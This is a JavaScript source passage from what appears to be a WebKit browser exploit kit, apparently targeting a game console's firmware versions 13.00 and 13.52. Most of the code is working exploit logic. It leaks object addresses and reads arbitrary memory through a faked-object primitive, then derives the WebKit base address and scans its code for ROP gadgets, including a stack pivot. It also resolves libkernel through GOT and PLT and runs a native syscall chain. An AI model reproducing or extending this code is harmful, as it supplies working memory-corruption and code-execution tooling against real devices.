    addBtn("G5 hunt expm1", function () { runG5HuntExpm1(); });
    addBtn("G5 scan upper", function () { runG5UpperScan(); });
    addBtn("G5 all-in", function () { runG5FullHunt(); });
    addBtn("Probe bound", function () { probeWebkitBound(); });
    addBtn("Try G5 13.00", function () { tryLegacyG5(0x2abccaa, "13.00"); });
    addBtn("G5 probe", function () {
        scanG5Full = true;
        runG5ClusterProbe();
    });

    const clearHost = host;
    const clearBtn = document.createElement("button");
    clearBtn.type = "button";
    clearBtn.className = "secondary";
    clearBtn.id = "btn-clear-pivot";
    clearBtn.textContent = "Clear pivot";
    clearBtn.disabled = false;
    wireClick(clearBtn, function () { clearPivotState(); });
    clearHost.appendChild(clearBtn);

    const restoreBtn = document.createElement("button");
    restoreBtn.type = "button";
    restoreBtn.className = "secondary";
    restoreBtn.id = "btn-restore-pivot";
    restoreBtn.textContent = "Restore HW pivot";
    restoreBtn.disabled = false;
    wireClick(restoreBtn, function () { restoreHwPivot(); });
    clearHost.appendChild(restoreBtn);

    const hint = host.querySelector(".bar-label");
    if (hint)
        hint.textContent = "G5 HW +0x13ec77a (expm1+0x53642a) — Verify pivot then Native call";
}

function wireGadgetBars() {
    const groups = { base: $("gadget-base"), pop: $("gadget-pop"), pivot: $("gadget-pivot") };
    for (let i = 0; i < MANUAL_TESTS.length; i++) {
        const t = MANUAL_TESTS[i];
        const host = groups[t.group];
        if (!host) continue;
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = t.label;
        b.disabled = true;
        const id = t.id;
        wireClick(b, function () { runManualTest(id); });
        host.appendChild(b);
        gadgetBtns.push(b);
    }
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function addPtr(label, addr, note) {
    if (!addr) return;
    const row = { label, addr: String(addr), note: note || "" };
    pointers.push(row);
    mark("ADDR", row.label + "  " + row.addr + (row.note ? "  (" + row.note + ")" : ""));
}

function walkCell(p, label, obj) {
    retained.push(obj);
    const cell = p.leakval(obj);
    addPtr(label + " cell", cell, "leakval");
    const hdr = read8p(p, cell);
    if (hdr) mark("HDR", label + " header=" + hdr);
    for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
        const q = read8p(p, cell.add32(off));
        if (q && q.low !== 0) addPtr(label + " " + tag, q, "cell+0x" + off.toString(16));
    }
    return cell;
}

function captureNativeChain(p, mFunctionOff, off) {
    const cell = walkCell(p, "Math.expm1", Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    addPtr("JSFunction (expm1)", mid, "cell+0x18");
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (nativeFn) {
        addPtr("native code ptr", nativeFn, "m_function / webkit .text");
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const q0 = read4p(p, nativeFn);
        if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
        if (off && off.wk_expm1_builtin) {
            const n = (nativeFn.hi * 0x100000000 + (nativeFn.low >>> 0))
                - (off.wk_expm1_builtin >>> 0);
            const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
            addPtr("webkitBase (assumed)", webkitBase,
                "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
        }
    }
    return nativeFn;
}

function addPairStatusPtrs() {
    const ps = pairStatus;
    const fields = [
        ["mainAddress", "carrier mainView"],
        ["mainVector", "main vector"],
        ["mainCellFromFakeSlot", "main from fake slot"],
        ["workerAddress", "carrier workerView"],
        ["workerVector", "worker vector"],
        ["workerButterfly", "worker butterfly"],
        ["fakeAddress", "fake cell"],
        ["fakeButterfly", "fake butterfly"],
    ];
    for (const [key, label] of fields) {
        const v = ps[key];
        if (v != null && v !== -1) addPtr(label, v, "pair/exploit");
    }
    mark("PAIR", "state=" + ps.state + " promoted=" + ps.promoted
        + " vectorOff=0x" + (ps.vectorOffset >>> 0).toString(16));
}

function renderMap() {
    if (!mapBody) return;
    if (pointers.length === 0) {
        mapBody.innerHTML = "<tr><td colspan=\"3\">no pointers</td></tr>";
        return;
    }
    mapBody.innerHTML = pointers.map((row, i) =>
        "<tr><td>" + row.label + "</td>"
        + "<td class=\"addr\" data-i=\"" + i + "\">" + row.addr + "</td>"
        + "<td>" + row.note + "</td></tr>"
    ).join("");
    mapBody.querySelectorAll(".addr").forEach(el => {
        el.addEventListener("click", () => {
            const row = pointers[+el.getAttribute("data-i")];
            if (row && addrIn) addrIn.value = row.addr.replace(/^0x/i, "");
            peekAt(parseAddr(row.addr.replace(/^0x/i, "")));
        });
    });

    if (pickPtr) {
        const cur = pickPtr.value;
        pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>"
            + pointers.map((row, i) =>
                "<option value=\"" + i + "\">" + row.label + " " + row.addr + "</option>"
            ).join("");
        if (cur) pickPtr.value = cur;
    }
}

function hexLine(addr, bytes) {
    const a = addr.low.toString(16).padStart(8, "0");
    const h = [...bytes].map(b => b.toString(16).padStart(2, "0")).join(" ");
    return a + "  " + h;
}

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function peekAt(addr) {
    const p = window.p;
    if (!p || !addr) {
        if (hexEl) hexEl.textContent = "bad address";
        return;
    }
    const out = [];
    let cur = addr;
    for (let row = 0; row < 8; row++) {
        const chunk = [];
        for (let i = 0; i < 8; i++) {
            const b = read1p(p, cur.add32(i));
            if (b == null) {
                if (hexEl) hexEl.textContent = out.join("\n") + "\n(read failed @ " + cur + ")";
                return;
            }
            chunk.push(b & 0xff);
        }
        out.push(hexLine(cur, chunk));
        cur = cur.add32(8);
    }
    if (hexEl) hexEl.textContent = out.join("\n");
    mark("PEEK", String(addr));
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    const key = detected.key || "13.52";
    let off = Object.assign({}, offsetsForKey(key).off || {});
    try {
        const cal = sessionStorage.getItem("wk-calibrated");
        if (cal) off = Object.assign(off, JSON.parse(cal));
    } catch (_) { }
    off = Object.assign(off, HW_GADGETS_1352, PIVOT_HW_1352);
    const scanned = loadScannedPivot();
    if (scanned) off = mergeScannedPivot(off, scanned);
    if (off.pivot_view_sp == null)
        off.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
    return off;
}

function pivotClusterRange(found) {
    const cap = scanCapOff();
    const known = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const k = PIVOT_ROWS[i][1];
        const r = (found && found[k] != null) ? found[k] : PIVOT_HW_1352[k];
        if (r != null) known.push(r);
    }
    if (!known.length) return null;
    let lo = known[0];
    let hi = known[0];
    for (let i = 1; i < known.length; i++) {
        if (known[i] < lo) lo = known[i];
        if (known[i] > hi) hi = known[i];
    }
    return {
        minRva: Math.max(SCAN_PIVOT_MIN, lo - SCAN_CLUSTER_PAD),
        maxRva: Math.min(cap, hi + SCAN_CLUSTER_PAD),
    };
}

function pivotScanRange(key, phase, found) {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    if (phase === "upper") {
        const lo = SCAN_LOW_MAX;
        if (lo >= cap) return null;
        return { minRva: lo, maxRva: cap };
    }
    if (phase === "nearg5") {
        const center = G5_HUNT_CENTER || pivotScanHint(key, found, cap, off);
        if (center <= 0 || center >= cap) return null;
        return {
            minRva: Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
            maxRva: Math.min(cap, center + G5_HUNT_RADIUS),
        };
    }
    if (phase === "cluster") {
        return pivotClusterRange(found);
    }
    if (phase === "low") {
        return { minRva: SCAN_PIVOT_MIN, maxRva: Math.min(SCAN_LOW_MAX, cap) };
    }
    const hint = pivotHint(key);
    if (hint <= 0 || hint >= cap) return null;
    return {
        minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
        maxRva: Math.min(cap, hint + SCAN_NEAR_RADIUS),
    };
}

function pivotScanPatterns(label, pat) {
    if (label === "G5") return G5_PATTERNS.map(g => g.pat);
    return [pat];
}

function pivotStartPhase(label) {
    return label === "G5" ? "nearg5" : "low";
}

function pivotScanFoundInit() {
    const found = Object.assign({}, PIVOT_HW_1352);
    const saved = loadScannedPivot();
    if (saved) Object.assign(found, saved);
    return found;
}

function bytesFromRead8Into(w, out, at) {
    at = at || 0;
    let v = w.low >>> 0;
    for (let i = 0; i < 4; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
    v = w.hi >>> 0;
    for (let i = 4; i < 8; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
}

function fillWindow16(p, base, rva, buf) {
    const w0 = read8p(p, base.add32(rva));
    if (!w0) return false;
    bytesFromRead8Into(w0, buf, 0);
    const w1 = read8p(p, base.add32(rva + 8));
    if (w1) bytesFromRead8Into(w1, buf, 8);
    else for (let i = 8; i < 16; i++) buf[i] = 0;
    return true;
}

function bytesFromRead8(w) {
    bytesFromRead8Into(w, _scanBytes);
    return _scanBytes;
}

function matchPatAt(bytes, startOff, pat) {
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        if ((bytes[startOff + i] & 0xff) !== pat[i]) return false;
    }
    return true;
}

function findPatInQword(bytes, pat) {
    const maxStart = 8 - pat.length;
    for (let start = 0; start <= maxStart; start++) {
        if (matchPatAt(bytes, start, pat)) return start;
    }
    return -1;
}

function scanState(msg) {
    if (stateEl) {
        stateEl.textContent = msg;
        stateEl.className = "warn";
    }
}

function g5CandPush(cands, entry, hint) {
    if (cands.length < SCAN_G5_CAND_MAX) {
        cands.push(entry);
        return;
    }
    let worst = 0;
    let worstDist = hint > 0
        ? Math.abs(cands[0].rva - hint)
        : -cands[0].rva;
    for (let i = 1; i < cands.length; i++) {
        const d = hint > 0
            ? Math.abs(cands[i].rva - hint)
            : -cands[i].rva;
        if (d > worstDist) {
            worst = i;
            worstDist = d;
        }
    }
    const nd = hint > 0
        ? Math.abs(entry.rva - hint)
        : -entry.rva;
    if (nd < worstDist) cands[worst] = entry;
}

function logG5Cands(cands) {
    if (!cands.length) return;
    const sorted = cands.slice().sort((a, b) => a.rva - b.rva);
    const show = Math.min(sorted.length, 8);
    for (let i = 0; i < show; i++)
        mark("G5-CAND", "+0x" + sorted[i].rva.toString(16)
            + (sorted[i].kind ? " " + sorted[i].kind : ""));
    if (sorted.length > show)
        mark("G5-CAND", "… +" + (sorted.length - show) + " more");
}

function pivotRowDone(found, key) {
    return found[key] != null || PIVOT_HW_1352[key] != null;
}

function advancePivotRowIdx(pivotScan) {
    while (pivotScan.rowIdx < PIVOT_ROWS.length) {
        const key = PIVOT_ROWS[pivotScan.rowIdx][1];
        if (!pivotRowDone(pivotScan.found, key)) return false;
        pivotScan.rowIdx++;
        pivotScan.cursor = null;
        pivotScan.phase = pivotStartPhase(PIVOT_ROWS[pivotScan.rowIdx]
            ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
    }
    return true;
}

function loadPivotScanState(base) {
    try {
        const raw = sessionStorage.getItem("wk-pivot-scan-state");
        if (!raw) return null;
        const st = JSON.parse(raw);
        if (!st || String(st.base) !== String(base)) return null;
        return st;
    } catch (_) {
        return null;
    }
}

function preparePivotScan(webkitBase) {
    const found = pivotScanFoundInit();
    let rowIdx = 0;
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const key = PIVOT_ROWS[i][1];
        if (found[key] == null && PIVOT_HW_1352[key] == null) {
            rowIdx = i;
            break;
        }
        if (i === PIVOT_ROWS.length - 1) rowIdx = PIVOT_ROWS.length;
    }
    const prev = loadPivotScanState(webkitBase);
    const rowLabel = rowIdx < PIVOT_ROWS.length ? PIVOT_ROWS[rowIdx][0] : "";
    const startPhase = pivotStartPhase(rowLabel);
    pivotScan = {
        base: String(webkitBase),
        rowIdx,
        cursor: (prev && prev.rowIdx === rowIdx && prev.phase === startPhase) ? prev.cursor : null,
        phase: (prev && prev.rowIdx === rowIdx) ? (prev.phase || startPhase) : startPhase,
        found,
        bestHit: (prev && prev.rowIdx === rowIdx) ? (prev.bestHit || null) : null,
        g5Cands: (prev && prev.rowIdx === rowIdx && prev.g5Cands) ? prev.g5Cands : [],
    };
    if (rowIdx < PIVOT_ROWS.length) {
        mark("SCAN-START", "scanning " + PIVOT_ROWS[rowIdx][0]
            + " (" + (rowIdx + 1) + "/" + PIVOT_ROWS.length + ")");
    }
    savePivotScanState(pivotScan);
}

function savePivotScanState(st) {
    if (!st) return;
    try {
        sessionStorage.setItem("wk-pivot-scan-state", JSON.stringify({
            base: st.base,
            rowIdx: st.rowIdx,
            cursor: st.cursor,
            phase: st.phase,
            found: st.found,
            bestHit: st.bestHit || null,
            g5Cands: st.g5Cands || [],
        }));
    } catch (_) { }
}

/** One bounded chunk per call — cal scanGadgetChunk style. */
async function scanPivotRowPhase(p, webkitBase, off) {
    if (!pivotScan || String(pivotScan.base) !== String(webkitBase))
        preparePivotScan(webkitBase);
    pivotScan.found = Object.assign(pivotScanFoundInit(), pivotScan.found);
    if (pivotScan.bestHit == null) pivotScan.bestHit = null;
    if (!pivotScan.g5Cands) pivotScan.g5Cands = [];

    if (pivotScan.rowIdx >= PIVOT_ROWS.length || advancePivotRowIdx(pivotScan)) {
        mark("SCAN-DONE", "all pivot rows processed");
        savePivotScanState(pivotScan);
        return "done";
    }

    const row = PIVOT_ROWS[pivotScan.rowIdx];
    const key = row[1];
    const label = row[0];
    const pat = pivotPattern(row, off);
    const pats = pivotScanPatterns(label, pat);
    const patKinds = label === "G5" ? G5_PATTERNS.map(g => g.kind) : null;
    if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
    const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
    if (!range) {
        if (label === "G5" && pivotScan.phase === "cluster") {
            mark("G5-PHASE", "no cluster — use G5 bar or full scan");
            pivotScan.rowIdx++;
            pivotScan.cursor = null;
            pivotScan.phase = "cluster";
            pivotScan.bestHit = null;
            pivotScan.g5Cands = [];
            savePivotScanState(pivotScan);
            return "continue";
        }
        if (pivotScan.phase === "cluster") {
            pivotScan.phase = "low";
            pivotScan.cursor = null;
            pivotScan.bestHit = null;
            savePivotScanState(pivotScan);
            mark("SCAN-PHASE", label + " — cluster skip, low .text");
            return "continue";
        }
        mark("SCAN-MISS", label + " — no scan range");
        pivotScan.rowIdx++;
        pivotScan.cursor = null;
        pivotScan.phase = pivotStartPhase(
            PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        return "continue";
    }

    let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~7);
    let steps = 0;
    const hint = pivotScanHint(key, pivotScan.found, scanCapOff(), loadEffectiveOff());
    const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;

    while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
        if (label === "G5") {
            scanG5PatternsAt(p, webkitBase, rva, pivotScan.g5Cands, hint || G5_HUNT_CENTER);
            const best = pickBestG5Cand(pivotScan.g5Cands, hint || G5_HUNT_CENTER);
            if (best) pivotScan.bestHit = best;
        } else {
            const w = read8p(p, webkitBase.add32(rva));
            if (w) {
                const bytes = bytesFromRead8(w);
                for (let pi = 0; pi < pats.length; pi++) {
                    const offIn = findPatInQword(bytes, pats[pi]);
                    if (offIn < 0) continue;
                    const cand = rva + offIn;
                    if (pivotScan.bestHit == null)
                        pivotScan.bestHit = { rva: cand };
                    else if (hint > 0
                        && Math.abs(cand - hint) < Math.abs(pivotScan.bestHit.rva - hint))
                        pivotScan.bestHit = { rva: cand };
                }
            }
        }
        rva += 8;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }

    pivotScan.cursor = rva;
    scanState("scan " + label + " " + pivotScan.phase + " @+0x" + rva.toString(16));

    if (scanPivotStop) {
        savePivotScanState(pivotScan);
        return "stopped";
    }

    if (rva < range.maxRva) {
        savePivotScanState(pivotScan);
        return "continue";
    }

    const hit = pivotScan.bestHit;
    pivotScan.cursor = null;
    savePivotScanState(pivotScan);

    if (hit != null) {
        pivotScan.found[key] = hit.rva;
        saveScannedPivot(webkitBase, pivotScan.found);
        if (label === "G5") {
            logG5Cands(pivotScan.g5Cands);
            mark("SCAN-HIT", "G5 +0x" + hit.rva.toString(16)
                + (hit.kind ? " " + hit.kind : "")
                + " phase=" + pivotScan.phase);
        } else {
            mark("SCAN-HIT", label + " +0x" + hit.rva.toString(16)
                + " phase=" + pivotScan.phase
                + (hint ? " hint=+0x" + hint.toString(16) : ""));
        }
        pivotScan.rowIdx++;
        pivotScan.phase = pivotStartPhase(
            PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        updatePivotReady(p, loadEffectiveOff());
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "nearg5") {
        pivotScan.phase = "cluster";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("G5-PHASE", "near-G0 (+0x2411ac) miss — trying G0-G4 cluster");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "cluster") {
        pivotScan.phase = "low";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("G5-PHASE", "cluster miss — low .text (16-byte scan)");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "low") {
        pivotScan.phase = "upper";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        const cap = scanCapOff();
        mark("G5-PHASE", "low miss — upper .text +0x" + SCAN_LOW_MAX.toString(16)
            + "…+0x" + cap.toString(16) + " (13.00 high G5 unmapped)");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "upper") {
        logG5Cands(pivotScan.g5Cands);
        mark("SCAN-MISS", "G5 not found — try G5 hunt expm1 or G5 all-in");
        pivotScan.rowIdx++;
        pivotScan.phase = "nearg5";
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        return "continue";
    }

    if (pivotScan.phase === "cluster") {
        pivotScan.phase = "low";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("SCAN-PHASE", label + " cluster miss — low .text");
        return "continue";
    }

    mark("SCAN-MISS", label + " not found — paste RVA if you find on HW");
    pivotScan.rowIdx++;
    pivotScan.phase = pivotStartPhase(
        PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
    pivotScan.bestHit = null;
    pivotScan.g5Cands = [];
    savePivotScanState(pivotScan);
    return "continue";
}

function stopPivotScanQuiet() {
    scanPivotStop = true;
    scanPivotAuto = false;
}

function runG5ClusterProbe() {
    if (!ready || !window.p || busy) return;
    if (scanPivotAuto) {
        scanPivotStop = true;
        mark("SCAN-STOP", "stopping…");
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    preparePivotScan(webkitBase);
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][0] === "G5") {
            pivotScan.rowIdx = i;
            break;
        }
    }
    pivotScan.phase = "nearg5";
    pivotScan.cursor = null;
    pivotScan.bestHit = null;
    pivotScan.g5Cands = [];
    savePivotScanState(pivotScan);
    mark("G5-PROBE", "near-G0 @+0x2411ac (G0+0x15d362, chunked)");
    runPivotScanLoop(true);
}

async function runPivotScanLoop(g5Only) {
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) return;

    scanPivotAuto = true;
    scanPivotStop = false;
    scanQuiet = true;
    busy = true;
    setUi();

    try {
        while (scanPivotAuto && !scanPivotStop) {
            const st = await scanPivotRowPhase(p, webkitBase, off);
            if (st === "stopped") break;
            if (g5Only) {
                if (pivotScan.found.wk_PUSH_RDX_POP_RSP_RET != null) break;
                if (pivotScan.rowIdx > 6) break;
            } else if (st === "done") {
                break;
            }
        }
        if (scanPivotStop)
            mark("SCAN-STOP", "cancelled");
        else if (!g5Only)
            verifyPivotManual();
        else if (pivotScan.found.wk_PUSH_RDX_POP_RSP_RET != null)
            mark("G5-PICK", "+0x" + pivotScan.found.wk_PUSH_RDX_POP_RSP_RET.toString(16)
                + " — tap Verify pivot");
    } catch (err) {
        mark("SCAN-FAIL", err.message || String(err));
        state("scan error", "bad");
    } finally {
        scanQuiet = false;
        scanRenderPending = 0;
        scanPivotAuto = false;
        scanPivotStop = false;
        busy = false;
        renderOut();
        setUi();
    }
}

async function runPivotScanAuto() {
    if (!ready || !window.p) return;
    if (scanPivotAuto) {
        scanPivotStop = true;
        mark("SCAN-STOP", "stopping after current chunk…");
        return;
    }

    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("SCAN-SKIP", "no webkitBase — Save bases first");
        return;
    }

    preparePivotScan(webkitBase);
    const missing = PIVOT_ROWS.filter(r =>
        pivotScan.found[r[1]] == null && PIVOT_HW_1352[r[1]] == null
    ).map(r => r[0]);
    if (missing.length === 0) {
        mark("SCAN-SKIP", "all 7 pivot RVAs set — tap Verify pivot");
        verifyPivotManual();
        return;
    }
    state("scanning " + missing.join(", ") + "…", "warn");
    mark("SCAN-AUTO", "missing: " + missing.join(", ")
        + " — chunked " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");

    await runPivotScanLoop(false);
}

async function scanPivotChunk() {
    return runPivotScanAuto();
}

function verifyPivotManual() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("PIVOT-SKIP", "no webkitBase — Save bases first");
        return;
    }
    const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
    mark("PIVOT-CHECK", "G5="
        + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — HW +0x13ec77a"));
    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
    if (v.missing.length)
        mark("PIVOT-MISS", v.missing.join(", ") + " — tap a G5 button above");
    if (v.bad.length) {
        mark("PIVOT-BAD", v.bad.join(", ") + " — bytes mismatch at RVA");
        logPivotBadBytes(p, webkitBase, off, v.bad);
    }
    if (v.good.length)
        mark("PIVOT-OK", v.good.join(", "));
    pivotReady = v.ok;
    if (v.ok) {
        mark("PIVOT-READY", v.count + "/" + v.total + " — Native call unlocked");
        state("pivot chain OK — Native call enabled", "ok");
    } else {
        state("pivot not ready — " + pivotNotReadyMsg(v), "warn");
    }
    setUi();
}

function captureNativeFnQuick(p, off) {
    try {
        const raw = sessionStorage.getItem("wk-nativeFn");
        if (raw) {
            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
            if (fn) return fn;
        }
    } catch (_) { }
    const cell = p.leakval(Math.expm1);
    return p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
}

function resolveLibkernelBase(p, off, webkitBase) {
    const r = resolveLibkernel(p, webkitBase, off, {
        log: mark,
        read8: read8p,
    });
    return r.ok ? r.lk : null;
}

let iatScanState = null;

async function runScanIat() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    if (iatScanState && !iatScanState.done) {
        iatScanState = null;
        mark("LK-STOP", "IAT scan cancelled");
        return;
    }
    busy = true;
    setUi();
    iatScanState = null;
    mark("LK-SCAN", "ELF DT_PLTGOT → GOT slots → PLT xrefs");
    scanState("IAT scan…");
    let ticks = 0;
    const maxTicks = 60000;
    try {
        while (ticks++ < maxTicks) {
            const chunk = scanErrorIatChunk(p, webkitBase, off, iatScanState);
            iatScanState = chunk.state;
            if (chunk.phase === "elf-hit")
                mark("LK-ELF", "DT_PLTGOT +0x" + chunk.gotPlt.toString(16));
            else if (chunk.phase === "elf-miss")
                mark("LK-PHASE", "no DT_PLTGOT — PLT xrefs in .text");
            else if (chunk.phase === "gotplt-miss")
                mark("LK-PHASE", "GOT walk miss — PLT xrefs");
            else if (chunk.phase === "gotplt")
                scanState("GOT slot " + chunk.gotIdx + "/384");
            else if (chunk.phase === "code")
                scanState("PLT xref +0x" + chunk.cursor.toString(16)
                    + " q=" + chunk.queued);
            else if (chunk.phase === "verify")
                scanState("verify GOT " + chunk.left + " left");
            if (chunk.done && chunk.lk) {
                mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16)
                    + " (" + (chunk.source || "?") + ")");
                state("libkernel OK", "ok");
                break;
            }
            if (chunk.done) {
                mark("LK-MISS", "no __imp___error via ELF/PLT");
                state("IAT scan miss", "bad");
                break;
            }
            if ((ticks & 31) === 0)
                renderOut();
            await new Promise(r => setTimeout(r, 0));
        }
        if (ticks >= maxTicks) {
            mark("LK-FAIL", "IAT scan timeout — reload and retry");
            state("IAT scan timeout", "bad");
        }
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("IAT scan error", "bad");
    } finally {
        busy = false;
        iatScanState = null;
        setUi();
        renderOut();
    }
}

async function ensureLibkernel(p, off, webkitBase) {
    let r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
    if (r.ok) return r.lk;
    mark("NATIVE-STEP", "libkernel (ELF/PLT — not brute GOT)…");
    let state = null;
    while (true) {
        const chunk = scanErrorIatChunk(p, webkitBase, off, state);
        state = chunk.state;
        if (chunk.done && chunk.lk) {
            mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16));
            return chunk.lk;
        }
        if (chunk.done) break;
        await new Promise(r => setTimeout(r, 0));
    }
    throw new Error("libkernel IAT not found — tap Scan IAT first");
}

function stripUiForNative() {
    for (const id of ["groom-bar", "peek-bar", "hint", "map",
        "gadget-base", "gadget-pop", "gadget-pivot"]) {
        const el = document.getElementById(id);
        if (el) el.style.display = "none";
    }
    const mapTable = document.getElementById("map");
    if (mapTable && mapTable.previousElementSibling)
        mapTable.previousElementSibling.style.display = "none";
    const hexTitle = document.getElementById("hex");
    if (hexTitle && hexTitle.previousElementSibling)
        hexTitle.previousElementSibling.style.display = "none";
}

function resolveWebkitBase(off, nativeFn) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    if (nativeFn && off.wk_expm1_builtin)
        return nativeFn.sub32(off.wk_expm1_builtin);
    return null;
}

async function doNativeCallImmediate() {
    if (!nativeAllowed) {
        mark("NATIVE-FAIL", "window.p broken — reload");
        state("native blocked", "bad");
        return;
    }
    const p = window.p;
    if (!p) throw new Error("window.p missing");

    const off = loadEffectiveOff();
    const nativeFn = captureNativeFnQuick(p, off);
    const webkitBase = resolveWebkitBase(off, nativeFn);
    if (!webkitBase) {
        mark("NATIVE-FAIL", "no webkitBase — run index_cal Accept first");
        state("need cal base", "bad");
        return;
    }
    const libkernelBase = await ensureLibkernel(p, off, webkitBase);
    if (nativeChain) {
        nativeChain.disarm();
        nativeChain = null;
    }
    mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase
        + " promoted=" + pairStatus.promoted);
    mark("NATIVE-STEP", "init chain…");
    const { initNativeCall } = await import("./native_call.js");
    const chain = initNativeCall(p, off, {
        webkitBase,
        nativeFn,
        libkernelBase,
        log: mark,
        trustGadgets: true,
        noStubScan: false,
        stubScanMax: 0x8000,
        getpidOnly: true,
    });
    nativeChain = chain;
    try {
        sessionStorage.setItem("wk-libkernelBase", String(libkernelBase));
    } catch (_) { }
    mark("NATIVE-CALL", "getpid… build=" + BUILD_ID);
    const pid = chain.sc(20).i32;
    if (pid > 0) {
        mark("NATIVE-OK", "getpid=" + pid);
        state("native call OK pid=" + pid, "ok");
    } else {
        mark("NATIVE-FAIL", "getpid=" + pid);
        state("getpid returned <=0", "bad");
    }
}

async function freeBeforeNative() {
    stripUiForNative();
    retained.length = 0;
    pointers.length = 0;
    mark("NATIVE-PREP", "ui trimmed — groom stays pinned");
    exploit = null;
}

function seedNativeSession(p, off) {
    const fn = captureNativeFnQuick(p, off);
    if (fn) {
        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
        const base = resolveWebkitBase(off, fn);
        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
    }
    return fn;
}

async function runRwProofManual() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        pointers.length = 0;
        renderMap();
        const ok = await runRwProof(window.p, loadEffectiveOff());
        mark(ok ? "PASS" : "WARN", "RW proof map done — " + pointers.length + " ptrs");
        state(ok ? "RW proof OK" : "RW proof partial", ok ? "ok" : "warn");
    } finally {
        busy = false;
        setUi();
    }
}

async function runNativeCall() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        await freeBeforeNative();
        await doNativeCallImmediate();
    } catch (err) {
        if (nativeChain) {
            try { nativeChain.disarm(); } catch (_) { }
            nativeChain = null;
        }
        mark("NATIVE-FAIL", err.message || String(err));
